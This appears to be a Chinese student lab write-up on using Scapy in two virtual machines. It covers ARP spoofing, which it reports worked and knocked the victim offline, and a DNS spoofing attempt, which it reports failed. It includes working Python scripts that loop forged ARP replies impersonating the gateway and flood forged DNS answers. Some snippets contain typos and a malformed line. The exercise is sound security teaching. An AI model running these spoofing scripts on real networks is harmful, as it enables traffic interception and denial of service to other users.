## Scapy实验的内容

（1）使用scapy在Linux下写程序来模拟完成一个简单的ARP欺骗。

（2）使用scapy在Linux下写程序来模拟完成一个简单的DNS欺骗。完整的攻击实现工作量和难度都很大。为了降低难度，可以不实现中间人攻击，而是直接让受害者把DNS服务器修改为欺骗者的地址。

<!--more-->

## scapy功能

Scapy是一个Python程序，使用户能够发送，嗅探和剖析并伪造网络数据包。**此功能允许构建可以探测，扫描或攻击网络的工具。**

Scapy是一个功能强大的交互式数据包操作程序。它能够伪造或解码大量协议的数据包，通过线路发送，捕获它们，匹配请求和回复等等。Scapy可以轻松处理大多数经典任务，如扫描，跟踪路由，探测，单元测试，攻击或网络发现。

## 实验步骤

实验使用两个linux ubuntu版本的虚拟机。

其中一个为攻击虚拟机，另一个为受害者。

对于攻击机：

下载python3-scapy

```
sudo apt install python3-scapy
```

![image-20220306190721919](https://gitee.com/Hijack8/tc/raw/master/img2/image-20220306190721919.png)

这是scapy的交互式界面。

虽然说交互式界面也能够完成很多事情，但是显然没有直接使用py文件进行编译来的舒服。所以，我们下面学习利用python的scapy包进行操作。

下载包

```
pip install scapy
```

运行一下ICMP包的测试程序。

```python
from sacpy.all import *

icmp_ping = IP(dst = 'baidu.com')/ICMP()
icmp_ping.show()
icmp_ping.show2()
```

![image-20220306192604994](https://gitee.com/Hijack8/tc/raw/master/img2/image-20220306192604994.png)

Scapy 提供了四种发送数据包的方法，`sendp, send, srp, sr`。`sendp` 和 `send` 是只**发送数据包**，区别是前者是发送二层数据包，而后者是发送三层数据包；`sr` 和 `srp` 与之类似，只不过这两种方法**还会接收返回的响应报文。**

我们尝试发送数据包

```python
from sacpy.all import *

icmp_ping = IP(dst = '192.168.153.128')/ICMP()
icmp_ping.show()
icmp_ping.show2()

ans, unans = sr(icmp_ping)
ans.summary()
```

![image-20220306193728998](https://gitee.com/Hijack8/tc/raw/master/img2/image-20220306193728998.png)

尝试构建arp欺骗包

先观察生成的arp包。

```python
from scapy.all import *
arp0 = Ether(src = ''dst = '192.168.153.128')/ARP()
arp0.show()
```

![image-20220306194255884](https://gitee.com/Hijack8/tc/raw/master/img2/image-20220306194255884.png)

```python
from scapy.all import *
import time
#构造一个Ether以太网协议封装的ARP包
arp0 = Ether(src = '00:0c:29:65:75:02',
             dst = 'ff:ff:ff:ff:ff:ff')/
			 ARP(hwsrc = '00:0c:29:65:75:02', 
                 psrc = '192.168.153.2',
                 pdst = '192.168.153.128',
                 hwdst = '00:0c:29:dd:b6:f3',
                 hwlen = 6, 
                 plen = 4)
#arp0.show()
#每隔一秒向受害机发一个包
while 1 :
    sendp(arp0)
    time.sleep(1)
```

观察结果：

这是正常的网关MAC

![image-20220306202056321](https://gitee.com/Hijack8/tc/raw/master/img2/image-20220306202056321.png)

这是攻击后的网关MAC，可以看到网关的MAC变成了自己主机的MAC。

![image-20220306202627758](https://gitee.com/Hijack8/tc/raw/master/img2/image-20220306202627758.png)

并且受害者主机也没法上网了。。。

![image-20220306202754953](https://gitee.com/Hijack8/tc/raw/master/img2/image-20220306202754953.png)

## DNS欺骗

构造DNS欺骗数据包，将baidu.com地址解析为1.1.1.1。

先观察生成DNS包的数据条目：

```python
from scapy.all import *

dns0 = IP()/UDP()/DNS()

dns0.show()
```

![image-20220306203142247](https://gitee.com/Hijack8/tc/raw/master/img2/image-20220306203142247.png)

```python
from scapy.all import *
import time
'''
dns0 = IP(src = '127.0.0.53',dst = '192.168.153.128')/UDP(dport = 33333,sport = 53)/DNS(
	qd = 'www.baidu.com',
	qr = 1,
	ra = 1,
	ancount = 1,
	an = DNSRR(
	    rrname = 'www.taobao.com',
	    type = 'A',
	    rclass = 'IN',
	    ttl = 900,
	    rdata = '1.1.1.1'
	)
	#opcode = 0
	)
'''
#伪造回应包
domain = 'www.google.com'
target_server = '192.168.153.128'
iplist = '192.168.153.2'

ID = []
for i in range(500): 
    #ID.append(random.randint(0,65535))
    ID.append(i)
fake_p = IP(dst=target_server,src=iplist)/\
         UDP(sport=53, dport=33333)/\
         DNS(id=ID,qr=1,ra=1,
          qd=DNSQR(qname=domain,  qtype="A", qclass=1),
          an=DNSRR(rrname=domain,ttl = 7200,rdata="1.1.1.1")
          )
#dns0.show()
for i in range(65536):
    send(fake_p)
    time.sleep(0.1)
```

对于dns欺骗，要比arp欺骗多一个步骤，要先把受害机发送的dns查询报文截取到，在这里使用sniff进行嗅探。

![image-20220307084206795](https://gitee.com/Hijack8/tc/raw/master/img2/image-20220307084206795.png)

![image-20220307091720422](https://gitee.com/Hijack8/tc/raw/master/img2/image-20220307091720422.png)

本次实验虽然是可以在受害者机上抓取到攻击机发送的dns包，但是dns欺骗并没有成功。

